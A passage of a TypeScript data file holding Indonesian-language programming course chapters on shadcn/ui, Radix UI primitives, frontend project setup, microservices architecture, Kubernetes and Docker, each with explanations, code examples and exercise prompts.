    codeExample: { language: "tsx", code: "import {\n  Dialog, DialogContent, DialogDescription,\n  DialogHeader, DialogTitle, DialogTrigger, DialogFooter,\n} from '@/components/ui/dialog';\nimport { Button } from '@/components/ui/button';\nimport { Input } from '@/components/ui/input';\nimport { toast } from 'sonner';\nimport { Toaster } from '@/components/ui/sonner';\n\nfunction DeleteConfirmDialog({ itemName, onDelete }: {\n  itemName: string;\n  onDelete: () => void;\n}) {\n  const [open, setOpen] = useState(false);\n\n  return (\n    <Dialog open={open} onOpenChange={setOpen}>\n      <DialogTrigger asChild>\n        <Button variant=\"destructive\" size=\"sm\">Hapus</Button>\n      </DialogTrigger>\n      <DialogContent>\n        <DialogHeader>\n          <DialogTitle>Konfirmasi Hapus</DialogTitle>\n          <DialogDescription>\n            Apakah kamu yakin ingin menghapus {itemName}?\n            Tindakan ini tidak bisa dibatalkan.\n          </DialogDescription>\n        </DialogHeader>\n        <DialogFooter>\n          <Button variant=\"outline\" onClick={() => setOpen(false)}>\n            Batal\n          </Button>\n          <Button\n            variant=\"destructive\"\n            onClick={() => {\n              onDelete();\n              setOpen(false);\n              toast.success(`${itemName} berhasil dihapus`);\n            }}\n          >\n            Ya, Hapus\n          </Button>\n        </DialogFooter>\n      </DialogContent>\n    </Dialog>\n  );\n}\n\n// Root layout\nfunction RootLayout() {\n  return (\n    <>\n      <Toaster position=\"top-right\" richColors />\n      <App />\n    </>\n  );\n}" },

    explainAlong: "Dialog dikontrol dengan state open. onOpenChange memungkinkan kontrol penuh. DialogTrigger mengubah child menjadi pemicu. Toast dipanggil setelah aksi berhasil.",

    aiPrompt: "Buat form create item di dalam Dialog. Setelah submit berhasil, tutup dialog dan tampilkan toast. Gunakan loading state saat submit.",

    reflection: "Coba tab navigation di dalam Dialog. Perhatikan focus trapping — focus tidak bisa keluar dari modal. Ini accessibility feature dari Radix.",

  },

  {

    id: "16.16",

    moduleId: 16,

    chapterNum: "16.16",

    title: "Radix UI: Primitives untuk Accessible Components",

    subtitle: "Fondasi shadcn/ui: kuasai primitive untuk custom komponen sendiri",

    level: "Menengah-Lanjut",

    objectives: [

      "Memahami konsep primitives di Radix UI",

      "Bisa membuat komponen custom dari Radix",

      "Mengerti accessibility features built-in",

    ],

    analogy: { diagram: "Radix UI Primitives:\n├── Dialog (modal, focus trap, escape)\n├── DropdownMenu\n├── Tabs\n├── Accordion\n├── Tooltip\n├── Popover\n└── Slot (composition)\n\nSemua tanpa styling — kamu yang styling dengan Tailwind", caption: "Radix UI = behavior + accessibility, kamu tambahkan styling" },

    explanation: "Radix UI adalah library 'headless' — menyediakan behavior, accessibility, dan logic komponen TANPA styling.\n\nIni adalah fondasi dari shadcn/ui, dan memahaminya akan memberimu kekuatan untuk membuat komponen custom yang tidak ada di shadcn/ui.\\n\\n**Konsep Primitives**\\nPrimitive berarti 'dasar' atau 'pangkal'.\n\nRadix UI menyediakan komponen dasar yang menangani hal-hal sulit:\\n- **Keyboard navigation**: Tab, arrow keys, Escape, Enter/Space\\n- **Focus management**: Focus trap, auto-focus, focus restoration\\n- **Screen reader support**: ARIA attributes, roles,\n\nLive regions\\n- **Scroll locking**: Mencegah scroll background saat modal terbuka\\n- **Positioning**: Menempatkan popover/dropdown di posisi yang tepat\\n\\nKamu tinggal menambahkan styling (biasanya dengan Tailwind).\\n\\n**Mengapa Primitives Penting?**\\nMembuat komponen interaktif yang accessible itu SANGAT sulit.\n\nContoh sederhana: modal dialog.\n\nTerlihat mudah: div dengan position fixed dan z-index tinggi. Tapi coba pikirkan:\\n\\n1. Saat modal terbuka, focus harus pindah ke dalam modal\\n2. Tab harus berputar di dalam modal saja (focus trap)\\n3.\n\nEscape key harus menutup modal\\n4. Saat modal ditutup, focus harus kembali ke elemen pemicu\\n5. Screen reader harus mengumumkan modal\\n6. Scroll background harus terkunci\\n\\nItu baru modal!\n\nKomponen seperti dropdown, tabs, accordion semuanya punya accessibility requirements yang kompleks. Radix UI menangani SEMUA ini untukmu.\\n\\n**Cara Menggunakan Radix**\\n```tsx\\nimport * as Dialog from '@radix-ui/react-dialog';\\n\\n<Dialog.Root>\\n  <Dialog.Trigger>Buka Modal</Dialog.Trigger>\\n  <Dialog.Portal>\\n    <Dialog.Overlay className=\\\"fixed inset-0 bg-black/50\\\" />\\n    <Dialog.Content className=\\\"fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-white p-6 rounded-lg\\\">\\n      <Dialog.Title>Judul Modal</Dialog.Title>\\n      <Dialog.Description>Konten modal di sini</Dialog.Description>\\n      <Dialog.Close>Tutup</Dialog.Close>\\n    </Dialog.Content>\\n  </Dialog.Portal>\\n</Dialog.Root>\\n```\\n\\n**Pattern: Compound Components**\\nRadix menggunakan pattern compound components — komponen yang bekerja sama sebagai satu kesatuan. Dialog.Root, Dialog.Trigger, Dialog.Content, dll. Ini memberikan fleksibilitas maksimal dalam komposisi.\\n\\n**Slot Pattern**\\nRadix menyediakan Slot component yang memungkinkan child menerima props dari parent.\n\nIni berguna untuk membuat komponen yang bisa wrap elemen apa pun.",

    codeExample: { language: "tsx", code: "// Custom Dropdown dari Radix primitives + Tailwind\nimport * as DropdownMenu from '@radix-ui/react-dropdown-menu';\nimport { ChevronDown, Check } from 'lucide-react';\nimport { useState } from 'react';\n\nfunction CustomDropdown({ options, value, onChange }: {\n  options: { label: string; value: string; icon?: React.ReactNode }[];\n  value: string;\n  onChange: (value: string) => void;\n}) {\n  const [open, setOpen] = useState(false);\n  return (\n    <DropdownMenu.Root open={open} onOpenChange={setOpen}>\n      <DropdownMenu.Trigger asChild>\n        <button className=\"flex items-center gap-2 px-4 py-2 border rounded-lg hover:bg-gray-50\">\n          {options.find(o => o.value === value)?.label ?? 'Pilih...'}\n          <ChevronDown className=\"w-4 h-4\" />\n        </button>\n      </DropdownMenu.Trigger>\n      <DropdownMenu.Portal>\n        <DropdownMenu.Content\n          className=\"min-w-[200px] bg-white rounded-lg shadow-lg border p-1\"\n          sideOffset={4}\n          align=\"start\"\n        >\n          {options.map(option => (\n            <DropdownMenu.Item\n              key={option.value}\n              className=\"flex items-center gap-2 px-3 py-2 rounded-md text-sm cursor-pointer hover:bg-blue-50 hover:text-blue-700 outline-none\"\n              onSelect={() => onChange(option.value)}\n            >\n              {option.icon}\n              <span className=\"flex-1\">{option.label}</span>\n              {value === option.value && <Check className=\"w-4 h-4 text-blue-600\" />}\n            </DropdownMenu.Item>\n          ))}\n        </DropdownMenu.Content>\n      </DropdownMenu.Portal>\n    </DropdownMenu.Root>\n  );\n}" },

    explainAlong: "DropdownMenu.Portal render content di DOM tree terpisah (avoid z-index issues). DropdownMenu.Item sudah include keyboard navigation dan focus management.",

    aiPrompt: "Buat komponen Tabs dari Radix Tabs primitive. Styling dengan Tailwind, tambahkan animasi transisi saat tab berganti.",

    reflection: "Akses komponen shadcn/ui yang sudah kamu install. Lihat kode sumbernya — notice bagaimana mereka menggunakan Radix primitives di dalamnya.",

  },

  {

    id: "16.17",

    moduleId: 16,

    chapterNum: "16.17",

    title: "Radix UI: Compound Components dan Composition",

    subtitle: "Pattern komposisi tingkat lanjut untuk komponen fleksibel",

    level: "Menengah-Lanjut",

    objectives: [

      "Menguasai compound components pattern",

      "Bisa menggunakan Slot dan asChild",

      "Membuat komponen yang fully composable",

    ],

    analogy: { diagram: "Composition Pattern:\n<Dialog>\n  <DialogTrigger asChild>\n    <Button>Open</Button>\n  </DialogTrigger>\n  <DialogContent>\n    <DialogHeader>\n      <DialogTitle>...</DialogTitle>\n    </DialogHeader>\n  </DialogContent>\n</Dialog>", caption: "Compound components + Slot = komponen yang bisa dikomposisi dengan elemen apa saja" },

    explanation: "Radix UI menggunakan pattern yang disebut 'compound components' — serangkaian komponen yang bekerja sama melalui shared context. Pattern ini adalah kunci untuk membuat komponen yang fleksibel dan composable.\\n\\n**Compound Components**\\nBayangkan komponen seperti LEGO set. Ada kotak besar (Root/Provider) yang berisi beberapa pieces kecil (Trigger, Content, Overlay, dll). Setiap piece punya fungsinya sendiri, tapi mereka saling terhubung melalui context.\\n\\nKeuntungan compound components:\\n1.\n\n**Fleksibilitas**: Kamu bisa mengatur layout sesuai kebutuhan\\n2. **Kontrol penuh**: Tidak terjebak di struktur yang rigid\\n3. **Customizable**: Ganti salah satu piece tanpa merusak yang lain\\n\\n**Slot dan asChild Pattern**\\nIni adalah pattern paling powerful di Radix. asChild memungkinkan komponen untuk 'melebur' ke child element — meneruskan semua behavior dan props ke elemen yang kamu tentukan.\\n\\nContoh:\\n```tsx\\n<DialogTrigger asChild>\\n  <Button>Open Dialog</Button>\\n</DialogTrigger>\\n```\\n\\nHasilnya: Button tetap menjadi Button (dengan styling dan behavior-nya), TAPI juga mendapatkan behavior trigger dari Dialog. It's the best of both worlds!\\n\\nTanpa asChild, DialogTrigger akan render button sendiri DAN button child-mu — double button!\\n\\n**Membuat Komponen Composable Sendiri**\\nKamu bisa menerapkan pattern ini di komponen custom-mu dengan:\\n1.\n\nBuat context dengan React.createContext\\n2. Buat Root component sebagai Provider\\n3. Buat sub-components yang consume context\\n4. Gunakan React.forwardRef untuk ref forwarding\\n5.\n\nPertimbangkan Slot pattern untuk composition",

    codeExample: { language: "tsx", code: "// Membuat komponen Accordion composable sendiri\nimport * as React from 'react';\nimport { ChevronDown } from 'lucide-react';\nimport { cn } from '@/lib/utils';\n\nconst AccordionContext = React.createContext<{\n  openItem: string | null;\n  setOpenItem: (id: string | null) => void;\n} | null>(null);\n\nfunction useAccordion() {\n  const ctx = React.useContext(AccordionContext);\n  if (!ctx) throw new Error('AccordionItem harus di dalam Accordion');\n  return ctx;\n}\n\nfunction Accordion({ children, className }: { children: React.ReactNode; className?: string }) {\n  const [openItem, setOpenItem] = React.useState<string | null>(null);\n  return (\n    <AccordionContext.Provider value={{ openItem, setOpenItem }}>\n      <div className={cn('divide-y rounded-lg border', className)}>{children}</div>\n    </AccordionContext.Provider>\n  );\n}\n\nfunction AccordionItem({ children, className }: { children: React.ReactNode; className?: string }) {\n  return <div className={cn('py-2', className)}>{children}</div>;\n}\n\nconst AccordionTrigger = React.forwardRef<HTMLButtonElement,\n  React.ButtonHTMLAttributes<HTMLButtonElement> & { value: string }\n>(({ className, value, children, ...props }, ref) => {\n  const { openItem, setOpenItem } = useAccordion();\n  const isOpen = openItem === value;\n  return (\n    <button\n      ref={ref}\n      onClick={() => setOpenItem(isOpen ? null : value)}\n      className={cn('flex w-full items-center justify-between px-4 py-3 text-sm font-medium hover:bg-gray-50 transition-colors', className)}\n      {...props}\n    >\n      {children}\n      <ChevronDown className={cn('h-4 w-4 transition-transform', isOpen && 'rotate-180')} />\n    </button>\n  );\n});\nAccordionTrigger.displayName = 'AccordionTrigger';\n\nfunction AccordionContent({ value, children, className }: {\n  value: string; children: React.ReactNode; className?: string;\n}) {\n  const { openItem } = useAccordion();\n  if (openItem !== value) return null;\n  return <div className={cn('px-4 pb-3 text-sm text-gray-600', className)}>{children}</div>;\n}\n\n// Penggunaan\n<Accordion>\n  <AccordionItem>\n    <AccordionTrigger value='1'>Apa itu React?</AccordionTrigger>\n    <AccordionContent value='1'>React adalah library UI...</AccordionContent>\n  </AccordionItem>\n</Accordion>" },

    explainAlong: "AccordionContext menghubungkan semua sub-komponen. useAccordion hook untuk consume context. Compound components memberikan API yang familiar dan fleksibel.",

    aiPrompt: "Tambahkan animasi ke AccordionContent menggunakan CSS transition height. Gunakan max-height trick atau react-animate-height.",

    reflection: "Bandingkan Accordion custom-mu dengan @radix-ui/react-accordion. Apa perbedaannya? Apa yang Radix tambahkan?",

  },

  {

    id: "16.18",

    moduleId: 16,

    chapterNum: "16.18",

    title: "Frontend Stack: Integrasi Lengkap",

    subtitle: "Satukan React + Vite + Tailwind + shadcn/ui + Radix dalam satu proyek",

    level: "Lanjut",

    objectives: [

      "Bisa setup project fullstack frontend",

      "Mengerti cara komponen saling terintegrasi",

      "Mampu membuat aplikasi lengkap dengan stack ini",

    ],

    analogy: { diagram: "Frontend Stack:\nReact + TypeScript → shadcn/ui → Radix primitives → Tailwind CSS → Vite", caption: "Semua teknologi ini saling melengkapi membentuk ekosistem frontend modern" },

    explanation: "Kita sudah mempelajari setiap teknologi secara individual. Sekarang saatnya menyatukan semuanya dalam satu proyek nyata.\\n\\n**Stack Overview**\\n1. **React + TypeScript**: Library UI dengan type safety\\n2. **Vite**: Build tool cepat dengan dev server instan\\n3.\n\n**Tailwind CSS**: Utility-first styling\\n4.\n\n**shadcn/ui**: Komponen UI copy-paste yang customizable\\n5.\n\n**Radix UI**: Primitives untuk accessibility dan behavior\\n\\n**Setup Project Baru (Langkah demi Langkah)**\\n\\nLangkah 1: Buat project dengan Vite\\n```bash\\nnpm create vite@latest my-app -- --template react-ts\\ncd my-app && npm install\\n```\\n\\nLangkah 2: Setup Tailwind CSS\\n```bash\\nnpm install -D tailwindcss postcss autoprefixer\\nnpx tailwindcss init -p\\n```\\nEdit tailwind.config.js dan tambahkan content path.\n\nTambahkan @tailwind directives ke index.css.\\n\\nLangkah 3: Setup shadcn/ui\\n```bash\\nnpx shadcn@latest init\\n```\\nIkuti wizard: pilih base color,\n\nCSS variables.\\n\\nLangkah 4: Install komponen yang dibutuhkan\\n```bash\\nnpx shadcn@latest add button card input form dialog table\\n```\\n\\nLangkah 5: Setup React Hook Form + Zod (untuk form)\\n```bash\\nnpm install react-hook-form @hookform/resolvers zod sonner\\n```\\n\\n**Struktur Folder Rekomendasi**\\nsrc/components/ui/ untuk shadcn/ui, src/hooks/ untuk custom hooks, src/pages/ untuk page components.\\n\\n**Workflow Development**\\n1.\n\nDesain dulu: Gambar layout dan komponen yang dibutuhkan\\n2. Install komponen: shadcn add [komponen]\\n3. Kustomisasi: Edit komponen shadcn jika perlu\\n4. Build page: Susun komponen jadi page\\n5.\n\nAdd interactivity: Hooks, state, form, API calls\\n6. Polish: Animasi, loading states, error handling\\n\\n**Tips Produktivitas**\\nGunakan VS Code extension Tailwind CSS IntelliSense. Bookmark docs: react.dev, tailwindcss.com, ui.shadcn.com, radix-ui.com. Copy-paste dari shadcn/ui examples sebagai starting point.",

    codeExample: { language: "bash", code: "# Setup lengkap dari nol\nnpm create vite@latest my-app -- --template react-ts\ncd my-app\n\nnpm install -D tailwindcss postcss autoprefixer\nnpx tailwindcss init -p\n\nnpx shadcn@latest init\n# Pilih: New York style, CSS variables: yes, base color: slate\n\nnpx shadcn@latest add button card input badge avatar dialog dropdown-menu form label separator skeleton sonner table tabs toast\n\nnpm install react-hook-form @hookform/resolvers zod sonner lucide-react\n\n# Jalankan\nnpm run dev" },

    explainAlong: "Command di atas setup project lengkap dari nol. 'New York' style adalah default shadcn dengan styling modern.",

    aiPrompt: "Setup project baru dengan stack lengkap. Buat halaman dashboard sederhana: sidebar, header, stat cards, dan data table.",

    reflection: "Dengan 18 chapter ini, kamu sudah menguasai ekosistem frontend modern. Apa proyek pertama yang ingin kamu bangun dengan stack ini?",

  },

];



// ============================================================

// MODUL 17: BACKEND MODERN (23 chapters)

// Bun, Hono, Drizzle ORM, Redis, Supabase, Dokploy



// ============================================================
// MODUL 10: MICROSERVICES ARCHITECTURE (6 chapters)
// ============================================================

const modul10: Chapter[] = [
  {
    id: "10.1", moduleId: 10, chapterNum: "10.1",
    title: "Monolith vs Microservices", subtitle: "Kapan harus memecah aplikasi?", level: "Lanjut",
    objectives: ["Memahami perbedaan monolith dan microservices", "Bisa menentukan kapan menggunakan microservices"],
    analogy: { diagram: "Monolith = Toko Serba Ada (1 bangunan besar)\nSemua di satu tempat\n\nMicroservices = Pasar (banyak kios kecil)\nTiap kios fokus 1 produk", caption: "Microservices seperti pasar — tiap service independen dan fokus" },
    explanation: "**Monolith** adalah aplikasi yang seluruh fitur berjalan dalam satu codebase dan satu deployment unit. Semua modul saling terhubung dalam proses yang sama.\n\n**Microservices** memecah aplikasi menjadi service-service kecil yang independen. Tiap service punya database sendiri, bisa di-deploy terpisah, dan berkomunikasi via network.\n\n**Kapan pindah ke microservices?**\n1. Tim engineering sudah > 50 orang.\n2. Deploy perlu dilakukan berkali-kali sehari.\n3. Satu fitur down mengakibatkan seluruh aplikasi down.\n4. Tech stack perlu bervariasi antar tim.",
    codeExample: { language: "typescript", code: "// MONOLITH\n// Semua di satu repo\nsrc/\n  controllers/\n  services/\n  models/\n  views/\n\n// MICROSERVICES\n// Tiap service repo terpisah\nservices/\n  user-service/      # Node.js\n  payment-service/   # Go\n  notification/      # Python\n  gateway/           # API Gateway" },
    explainAlong: "Monolith: satu repo, satu deploy. Microservices: banyak repo, deploy independen.",
    aiPrompt: "Kapan sebaiknya pindah dari monolith ke microservices?",
    reflection: "List 3 kelebihan dan 3 kekurangan microservices dibanding monolith.",
  },
  {
    id: "10.2", moduleId: 10, chapterNum: "10.2",
    title: "Service Communication", subtitle: "Sync (REST/gRPC) vs Async (Message Queue)", level: "Lanjut",
    objectives: ["Memahami synchronous vs asynchronous communication", "Bisa memilih pattern komunikasi yang tepat"],
    analogy: { diagram: "Sync = Telepon Langsung\nTunggu jawaban sebelum lanjut\n\nAsync = Email / Surat\nKirim, lanjut kerja lain, jawaban datang nanti", caption: "Komunikasi sync seperti telepon — blocking. Async seperti email — non-blocking." },
    explanation: "Service dalam microservices perlu berkomunikasi. Ada dua pola utama:\n\n**Synchronous** — Caller menunggu response sebelum lanjut. Contoh: REST API, gRPC.\nCocok untuk operasi yang butuh jawaban langsung seperti login, payment validation.\n\n**Asynchronous** — Caller kirim pesan dan langsung lanjut. Response datang nanti via callback atau event. Contoh: Message Queue (RabbitMQ, Kafka, NATS).\nCocok untuk operasi yang tidak butuh jawaban langsung: kirim email, proses gambar, generate report.\n\n**Best Practice:**\n- Gunakan async untuk cross-service calls yang tidak critical path.\n- Implement circuit breaker untuk sync calls agar failure tidak berantai.",
    codeExample: { language: "typescript", code: "// SYNC — REST API CALL\nconst user = await fetch(`http://user-service:3000/users/${id}`);\n// Blocking — tunggu response\n\n// ASYNC — MESSAGE QUEUE\nawait messageQueue.publish('order.created', {\n  orderId: '123',\n  userId: '456'\n});\n// Non-blocking — lanjut langsung\n\n// CONSUMER DI SERVICE LAIN\nqueue.consume('order.created', async (msg) => {\n  await sendEmail(msg.userId, 'Order diterima!');\n});" },
    explainAlong: "Sync: blocking, butuh response. Async: non-blocking, publish dan lanjut.",
    aiPrompt: "Jelaskan bedanya REST API dan Message Queue dalam komunikasi service.",
    reflection: "Implementasi async communication dengan RabbitMQ atau Redis Pub/Sub.",
  },
  {
    id: "10.3", moduleId: 10, chapterNum: "10.3",
    title: "API Gateway & Service Discovery", subtitle: "Gerbang masuk dan pencarian service", level: "Lanjut",
    objectives: ["Memahami peran API Gateway", "Bisa menggunakan service discovery"],
    analogy: { diagram: "Mall = API Gateway\n1 pintu masuk untuk semua toko\n\nDirectory = Service Discovery\nCari toko mana yang ada di lantai berapa", caption: "API Gateway seperti pintu masuk mall — semua request lewat sini" },
    explanation: "**API Gateway** adalah entry point tunggal untuk semua client requests. Ia meneruskan request ke service yang tepat.\n\n**Fungsi API Gateway:**\n1. **Routing** — /users ke user-service, /orders ke order-service.\n2. **Authentication** — Validasi JWT sebelum request masuk ke service.\n3. **Rate Limiting** — Batasi jumlah request per user.\n4. **SSL Termination** — Handle HTTPS, service dalamnya pakai HTTP.\n5. **Request/Response Transformation** — Ubah format jika perlu.\n\n**Service Discovery** — Service daftar di registry. Saat service baru muncul atau mati, registry di-update. Gateway atau client query registry untuk tahu service ada di mana.",
    codeExample: { language: "nginx", code: "// NGINX API GATEWAY CONFIG\nserver {\n  listen 80;\n  \n  location /users {\n    proxy_pass http://user-service:3000;\n  }\n  \n  location /orders {\n    proxy_pass http://order-service:3001;\n  }\n  \n  location /payments {\n    proxy_pass http://payment-service:3002;\n  }\n}\n\n// SERVICE DISCOVERY DENGAN CONSUL\nservices:\n  user-service:\n    image: user-service\n    environment:\n      - CONSUL_HTTP_ADDR=consul:8500" },
    explainAlong: "Gateway route path ke service berbeda. Service discovery daftarkan lokasi service.",
    aiPrompt: "Apa fungsi API Gateway dalam arsitektur microservices?",
    reflection: "Setup API Gateway dengan Nginx atau Kong. Route 3 service berbeda.",
  },
  {
    id: "10.4", moduleId: 10, chapterNum: "10.4",
    title: "Database per Service & Event Sourcing", subtitle: "Tiap service punya database sendiri", level: "Lanjut",
    objectives: ["Memahami database per service pattern", "Bisa menggunakan event sourcing"],
    analogy: { diagram: "Monolith = 1 Gudang Besar (semua barang campur)\nMicroservices = Tiap Toko punya Gudang Sendiri\n\nEvent Sourcing = Buku Jurnal (catat semua transaksi,\nbisa rebuild history)", caption: "Tiap service punya database sendiri — tidak sharing database" },
    explanation: "**Database per Service** adalah aturan emas dalam microservices. Tiap service punya database sendiri dan tidak boleh mengakses database service lain langsung.\n\n**Kenapa tidak sharing database?**\n1. Independence — Service bisa ganti tech stack database.\n2. Scaling — Scale database sesuai kebutuhan service.\n3. Failure isolation — DB satu service down tidak affect service lain.\n4. Schema evolution — Ganti schema tanpa affect service lain.\n\n**Event Sourcing** — Simpan setiap perubahan sebagai event, bukan hanya state terakhir. Semua event disimpan dalam event store. State saat ini bisa di-rebuild dengan replay semua event.\n\n**CQRS** — Separate read dan write model. Command mengubah state, Query membaca optimized view.",
    codeExample: { language: "sql", code: "// USER SERVICE — DATABASE SENDIRI\n// user-service/db/schema.sql\nCREATE TABLE users (\n  id UUID PRIMARY KEY,\n  email VARCHAR(255) UNIQUE,\n  name VARCHAR(255)\n);\n\n// ORDER SERVICE — DATABASE SENDIRI\n// order-service/db/schema.sql\nCREATE TABLE orders (\n  id UUID PRIMARY KEY,\n  user_id UUID,      -- referensi, bukan FK\n  total DECIMAL(10,2),\n  status VARCHAR(50)\n);\n\n// EVENT Sourcing EXAMPLE\n// Event Store\nCREATE TABLE events (\n  id SERIAL PRIMARY KEY,\n  aggregate_id UUID,\n  type VARCHAR(100),   -- 'OrderCreated', 'PaymentReceived'\n  payload JSONB,\n  created_at TIMESTAMP\n);" },
    explainAlong: "Tiap service DB terpisah. Event store catat semua perubahan sebagai event.",
    aiPrompt: "Jelaskan kenapa microservices tidak boleh sharing database.",
    reflection: "Design database schema untuk 3 microservices yang tidak sharing database.",
  },
  {
    id: "10.5", moduleId: 10, chapterNum: "10.5",
    title: "Distributed Tracing & Monitoring", subtitle: "Observability dalam sistem terdistribusi", level: "Lanjut",
    objectives: ["Memahami distributed tracing", "Bisa menggunakan Jaeger atau Zipkin"],
    analogy: { diagram: "Detective Story:\n\nRequest masuk → Service A → Service B → Service C → DB\n\nTracing = CCTV di setiap pintu\nBisa lihat kemana request pergi dan berapa lama", caption: "Distributed tracing seperti CCTV — melacak request melewati service-service" },
    explanation: "**Observability** adalah kemampuan untuk memahami apa yang terjadi di sistem dari luar. Tiga pilar observability:\n\n1. **Logging** — Catatan event per service. Aggregated dengan ELK stack atau Grafana Loki.\n2. **Metrics** — Data numerik: request rate, latency, error rate, CPU/memory.\n3. **Tracing** — Melacak satu request melewati banyak service. Trace terdiri dari spans.\n\n**Distributed Tracing Tools:**\n- **Jaeger** — Open source, inspired by Google's Dapper.\n- **Zipkin** — Open source dari Twitter.\n- **Tempo** — Dari Grafana Labs, lightweight.\n\n**OpenTelemetry** adalah standar observability universal. Instrumentasi sekali, bisa export ke berbagai backend (Jaeger, Zipkin, Prometheus, dll).",
    codeExample: { language: "typescript", code: "// OPENTELEMETRY IN NODE.JS\nimport { NodeSDK } from '@opentelemetry/sdk-node';\nimport { JaegerExporter } from '@opentelemetry/exporter-jaeger';\nimport { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';\n\nconst sdk = new NodeSDK({\n  traceExporter: new JaegerExporter({\n    endpoint: 'http://jaeger:14268/api/traces'\n  }),\n  instrumentations: [getNodeAutoInstrumentations()]\n});\n\nsdk.start();\n\n// TRACE EXAMPLE\n// GET /orders → 45ms total\n//   ├── gateway       : 2ms\n//   ├── auth-service  : 8ms\n//   ├── order-service : 25ms\n//   │     ├── db-query: 15ms\n//   │     └── cache   : 5ms\n//   └── notification  : 10ms" },
    explainAlong: "OpenTelemetry otomatis instrumentasi. Trace tunjukkan waktu tiap service.",
    aiPrompt: "Apa bedanya logging, metrics, dan tracing dalam observability?",
    reflection: "Setup distributed tracing dengan Jaeger atau Zipkin untuk 2 service.",
  },
  {
    id: "10.6", moduleId: 10, chapterNum: "10.6",
    title: "Container Orchestration dengan Kubernetes", subtitle: "Deploy dan manage microservices", level: "Lanjut",
    objectives: ["Memahami konsep container orchestration", "Bisa deploy service ke Kubernetes"],
    analogy: { diagram: "Container = Kotak barang\nKubernetes = Pelabuhan yang mengatur:\n- Kotak diletakkan di kapal mana\n- Berapa banyak kotak aktif\n- Kalau kapal tenggelam, pindahkan kotak", caption: "Kubernetes mengatur deployment, scaling, dan failover container secara otomatis" },
    explanation: "**Kubernetes (K8s)** adalah platform container orchestration open source dari Google. Ia mengatur deployment, scaling, dan management aplikasi containerized.\n\n**Konsep Utama Kubernetes:**\n1. **Pod** — Unit terkecil, bisa berisi 1+ container.\n2. **Deployment** — Mendefinisikan desired state (berapa replica, image apa).\n3. **Service** — Expose pod sebagai network service.\n4. **Ingress** — Routing HTTP/HTTPS dari luar cluster ke service.\n5. **ConfigMap & Secret** — Manage konfigurasi dan credential.\n\n**Keuntungan K8s:**\n- Auto scaling — Naikkan/turunkan pod berdasarkan CPU/requests.\n- Self-healing — Restart container yang mati, replace node yang down.\n- Rolling update — Deploy versi baru tanpa downtime.\n- Service discovery — DNS otomatis antar service.",
    codeExample: { language: "yaml", code: "# KUBERNETES DEPLOYMENT\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: user-service\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: user-service\n  template:\n    metadata:\n      labels:\n        app: user-service\n    spec:\n      containers:\n      - name: user-service\n        image: user-service:v1.0\n        ports:\n        - containerPort: 3000\n\n---\n# SERVICE\napiVersion: v1\nkind: Service\nmetadata:\n  name: user-service\nspec:\n  selector:\n    app: user-service\n  ports:\n  - port: 80\n    targetPort: 3000" },
    explainAlong: "Deployment tentukan replica dan image. Service expose pod ke network.",
    aiPrompt: "Jelaskan perbedaan Pod, Deployment, dan Service di Kubernetes.",
    reflection: "Deploy 2 service ke Kubernetes dengan Deployment dan Service manifest.",
  }
];

// ============================================================
// MODUL 11: KUBERNETES & CLOUD NATIVE (6 chapters)
// ============================================================

const modul11: Chapter[] = [
  {
    id: "11.1",
    moduleId: 11,
    chapterNum: "11.1",
    title: "Container dengan Docker",
    subtitle: "Package aplikasi dan dependensinya jadi container",
    level: "Lanjut",
    objectives: ["Memahami konsep container", "Bisa membuat Dockerfile"],
    analogy: { diagram: "VM = Rumah besar dengan segala perabot\nBerat, lama dibangun\n\nContainer = Apartemen modular\nRingan, cepat, efisien", caption: "Container lebih ringan dari VM karena berbagi OS kernel" },
    explanation: "**Container** adalah package yang berisi aplikasi beserta semua dependensinya. Container berjalan secara konsisten di environment mana pun.\n\n**Bedanya VM dan Container:**\n\nVM menyertakan seluruh OS guest — berat, lambat startup. Container berbagi OS kernel host — ringan, startup dalam detik.\n\n**Docker** adalah platform containerization paling populer. Tiga konsep utama:\n\n1. **Dockerfile.** Blueprint untuk build image. Berisi instruksi step-by-step.\n2. **Image.** Snapshot container yang immutable. Dibuat dari Dockerfile.\n3. **Container.** Instance running dari image. Bisa di-start, stop, hapus.\n\n**Best practice:** Urutkan dari yang paling jarang berubah ke yang sering berubah. Dependencies dulu, kode terakhir.",
    codeExample: { language: "dockerfile", code: "# DOCKERFILE UNTUK NODE.JS\nFROM node:18-alpine\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci --only=production\n\nCOPY . .\n\nEXPOSE 3000\nCMD [\"node\", \"server.js\"]" },
    explainAlong: "Multi-layer Dockerfile. Dependencies di-cache, source code di-copy terakhir. Alpine image lebih kecil.",
    aiPrompt: "Buat Dockerfile untuk aplikasi Node.js dan build image-nya.",
    reflection: "Kenapa container lebih cepat dari VM?",
  },
  {
    id: "11.2",
    moduleId: 11,
    chapterNum: "11.2",
    title: "Kubernetes: Dasar",
    subtitle: "Orkestrasi container di scale besar",
    level: "Lanjut",
    objectives: ["Memahami konsep Kubernetes", "Bisa menulis manifest YAML"],
    analogy: { diagram: "Docker = Mengemudi sendiri\nKamu kontrol semua\n\nKubernetes = Autopilot\nOtomatis mengatur, scale, heal", caption: "Kubernetes mengotomasi deploy, scale, dan healing container" },
    explanation: "**Kubernetes (K8s)** adalah platform orkestrasi container. K8s mengotomasi deployment, scaling, dan management aplikasi container.\n\n**Konsep dasar K8s:**\n\n1. **Pod.** Unit terkecil di K8s. Satu pod bisa berisi satu atau lebih container.\n2. **Deployment.** Mengelola replicas pod. Kalau pod mati, Deployment buat yang baru.\n3. **Service.** Expose pod ke network. Pod bisa diakses via Service.\n4. **Namespace.** Memisahkan resource antar team atau environment.\n\n**Cara kerja:**\n\nKamu menulis manifest YAML yang mendeskripsikan desired state. K8s memastikan actual state sesuai dengan desired state.\n\n**Control Plane:**\n\n- **API Server.** Entry point untuk semua perintah.\n- **Scheduler.** Menentukan pod di node mana.\n- **Controller Manager.** Menjaga desired state.\n- **etcd.** Database konfigurasi cluster.",
    codeExample: { language: "yaml", code: "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: myapp:v1\n        ports:\n        - containerPort: 3000" },
    explainAlong: "Deployment dengan 3 replicas. Selector matchLabels menghubungkan ke Pod template. Container expose port 3000.",
